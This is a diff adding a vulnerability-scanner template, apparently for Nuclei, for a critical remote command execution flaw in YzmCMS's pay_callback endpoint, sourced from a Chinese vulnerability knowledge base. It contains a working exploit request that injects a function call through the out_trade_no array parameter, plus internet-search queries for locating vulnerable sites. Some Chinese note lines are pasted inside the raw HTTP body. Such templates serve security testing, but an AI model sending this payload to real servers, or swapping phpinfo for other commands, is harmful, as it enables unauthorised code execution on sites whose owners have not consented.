@@ -1,0 +1,45 @@
+id: poc-qx22sug97qn3pp1q
+info:
+  name: YzmCMS pay_callback 任意命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qx22sug97qn3pp1q'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qx22sug97qn3pp1q
+    fofa: Fofa:app="yzmcms"或Hunter:app.name="YzmCMS"或Quake：app:"yzmcms"
+http:
+- raw:
+  - 'POST /pay/index/pay_callback.html HTTP/1.1
+
+
+    Accept-Encoding: gzip
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    php.ini
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
